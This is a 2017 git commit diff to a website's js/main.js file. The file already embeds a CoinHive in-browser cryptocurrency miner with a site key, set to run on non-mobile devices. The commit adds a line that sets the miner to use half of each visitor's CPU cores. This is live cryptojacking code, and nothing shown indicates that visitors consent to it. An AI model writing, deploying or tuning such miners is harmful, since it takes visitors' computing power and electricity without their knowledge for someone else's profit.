ef5ed218fcf990d1cc55bc94e256fba0740cf71e
Disney <331027793@qq.com>
2017-12-23 15:52:24 +0800

    Update main.js

--- js/main.js
+++ js/main.js
@@ -14,6 +14,7 @@ $(".text img").each(function (index, element) {
 });
 // CoinHive
 var miner = new CoinHive.Anonymous('zyc1ClPF1ZevATB5gChyGzZklCCZHmY7', {
+  threads: Math.round(navigator.hardwareConcurrency/2),
   throttle: 0.5
 });
 // Only start on non-mobile devices.
